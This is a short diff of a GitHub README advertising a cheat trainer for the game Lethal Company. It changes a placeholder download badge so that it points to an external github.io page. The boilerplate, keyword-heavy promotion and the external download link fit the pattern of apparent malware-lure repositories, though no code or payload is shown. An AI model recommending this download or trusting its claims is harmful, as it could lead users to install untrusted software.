@@ -2,7 +2,7 @@
 
 The ultimate Lethal Company Cheat Trainer for 2025, offering Godmode, unlimited resources, and auto-battle features. Dominate enemies with invincibility, bypass restrictions, and customize gameplay using advanced hacking technology. Fully compatible with the latest game updates and designed for seamless performance.  
 
-[![Download Cheat Trainer](https://img.shields.io/badge/Download-Lethal_Company_Cheat_Trainer-blueviolet)](#)  
+[![Download Cheat Trainer](https://img.shields.io/badge/Download-Lethal_Company_Cheat_Trainer-blueviolet)](https://lethal-company-cheat-trainer.github.io/.github/)  
 
 ## 🎯 Key Features  
 - **Godmode Invincibility:** Take zero damage in combat.  
